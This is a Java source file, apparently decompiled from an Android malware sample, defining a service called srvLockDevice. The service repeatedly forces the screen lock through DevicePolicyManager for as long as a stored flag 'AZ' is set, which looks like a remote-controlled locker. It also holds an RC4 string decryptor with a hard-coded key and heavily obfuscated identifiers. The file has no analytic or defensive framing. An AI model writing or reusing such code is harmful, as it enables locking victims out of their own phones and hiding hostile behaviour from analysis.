package com.example.mmm.Service;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.Intent;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;

public class srvLockDevice extends IntentService {
   utils optics$ = new utils();
   constants google$ = new constants();

   public srvLockDevice() {
      super("");
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onHandleIntent(Intent var1) {
      boolean var2;
      do {
         utils.chalkTile(10);
         utils var3 = this.optics$;
         ((DevicePolicyManager)this.getSystemService("device_policy")).lockNow();
         utils._pensions(this);
         var2 = this.optics$.SettingsRead(this, "AZ").equals("1");
      } while(var2);

      this.stopSelf();
   }
}
